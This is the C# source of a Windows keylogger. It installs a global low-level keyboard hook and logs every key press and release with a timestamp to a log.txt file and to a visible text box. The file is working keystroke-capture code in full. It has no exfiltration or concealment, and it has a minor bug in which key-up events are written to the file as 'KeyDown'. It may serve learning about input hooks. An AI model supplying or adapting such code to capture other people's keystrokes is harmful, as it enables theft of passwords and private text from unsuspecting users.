using System.Diagnostics;
using System.Runtime.InteropServices;

namespace KeyLogger;

public class Program
{
    [DllImport("user32.dll")]
    public static extern nint SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, nint wParam, uint lParam);
    [DllImport("kernel32.dll")]
    public static extern nint GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    public static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);

    private static int WH_KEYBOARD_LL = 13;
    private static int WM_KEYDOWN = 0x0100;
    private static int WM_SYSKEYDOWN = 0x0104;
    private static int WM_KEYUP = 0x0101;

    private static TextBox? outputTextBox;

    public static void Main(string[] args)
    {
        ApplicationConfiguration.Initialize();
        KeyLogger form = new KeyLogger();
        outputTextBox = form.OutputTextBox;

        // Redirect console output to the TextBox
        TextBoxWriter writer = new TextBoxWriter(outputTextBox);
        Console.SetOut(writer);

        HookCallbackDelegate hcDelegate = HookCallback;

        string mainModuleName = Process.GetCurrentProcess()!.MainModule!.ModuleName;
        nint hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

        Application.Run(form);
    }

    public static nint HookCallback(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0)
        {
            string path = Path.Combine(Environment.CurrentDirectory, "log.txt");
            int vkCode = Marshal.ReadInt32(lParam);
            string timeStamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.f");
            using (StreamWriter sw = new StreamWriter(path, true) { AutoFlush = true })
            {
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                {
                    sw.WriteLineAsync($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
                    Console.WriteLine($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
                }
                else if (wParam == WM_KEYUP)
                {
                    sw.WriteLineAsync($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
                    Console.WriteLine($"{timeStamp} - [KeyUp: {(Keys)vkCode}]");
                }
            }

        }
        return CallNextHookEx(nint.Zero, nCode, wParam, lParam);
    }

    public delegate nint HookCallbackDelegate(int nCode, nint wParam, nint lParam);
}
